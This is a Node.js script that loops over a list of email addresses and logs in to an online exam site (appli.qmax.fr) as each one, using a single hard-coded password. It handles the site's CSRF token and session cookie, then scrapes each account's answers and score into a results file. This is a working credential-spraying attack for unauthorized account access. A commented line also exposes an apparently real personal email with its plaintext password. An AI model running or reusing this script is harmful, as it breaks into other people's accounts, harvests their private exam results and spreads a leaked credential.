const cheerio = require("cheerio");
const fs = require("fs");
const db = JSON.parse(fs.readFileSync("./emails.json", "utf-8"));

const aFaitQMax = async (email, password) => {

	const prem = await fetch("https://appli.qmax.fr/challenge_2017/web/login-exam", {
		"headers": {
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"accept-language": "en-US,en;q=0.9",
			"cache-control": "no-cache",
			"pragma": "no-cache",
			"sec-ch-ua": "\"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\"",
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": "\"macOS\"",
			"sec-fetch-dest": "document",
			"sec-fetch-mode": "navigate",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"upgrade-insecure-requests": "1",
			"Referer": "https://appli.qmax.fr/challenge_2017/web/student-result-exam",
			"Referrer-Policy": "strict-origin-when-cross-origin"
		},
		"body": null,
		"method": "GET"
	});
	const html = cheerio.load(await prem.text())
	const val = html("input[name='form[_token]']").val()
	const setcook = prem.headers.getSetCookie()[0].split(";")[0]
	const sec = await fetch("https://appli.qmax.fr/challenge_2017/web/login-exam", {
		"headers": {
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"accept-language": "en-US,en;q=0.9",
			"cache-control": "max-age=0",
			"content-type": "application/x-www-form-urlencoded",
			"sec-ch-ua": "\"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\"",
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": "\"macOS\"",
			"sec-fetch-dest": "document",
			"sec-fetch-mode": "navigate",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"upgrade-insecure-requests": "1",
			"cookie": (setcook).split(";")[0],
		},
		"referrer": "https://appli.qmax.fr/challenge_2017/web/login-exam",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": "form%5Blogin%5D=" + encodeURIComponent(email) + "&form%5Bpassword%5D=" + encodeURIComponent(password) +"&form%5Bsave%5D=&form%5B_token%5D="+val,
		"method": "POST",
		"mode": "cors",
		"credentials": "include"
	});
	const text = await sec.text()

	if ((text).includes("Question 1")) {
		let list = []
		const traitement = cheerio.load(text)
		const quest = traitement("ul.questionList").children()
		let n = 0;
		for (let i = 0; i < quest.length; i++) {
			if (quest[i]["type"] != "text") {
				if (quest[i].children[1].attribs["class"].toString().length == 22) {
					list.push(true)
					n++
				}else{
					list.push(false)
				}
				
			}
		}
		return [true, list, n, quest.length]
	}else{
		return [false, null]
	}
}


(async() => {
	// console.log(await aFaitQMax("favier.guillaume02@gmail.com", "mShkk7iO"))
	let db2 = []
	for (let i = 0; i < db.length; i++) {
		let obj = [db[i][0], db[i][1],[]]
		const email = db[i][1];
		const res = await aFaitQMax(email, "mShkk7iO")
		obj[2].push(res)
		console.log(obj)
		db2.push(obj)
	}
	fs.writeFileSync("./res.json", JSON.stringify(db2,null, 4))
})()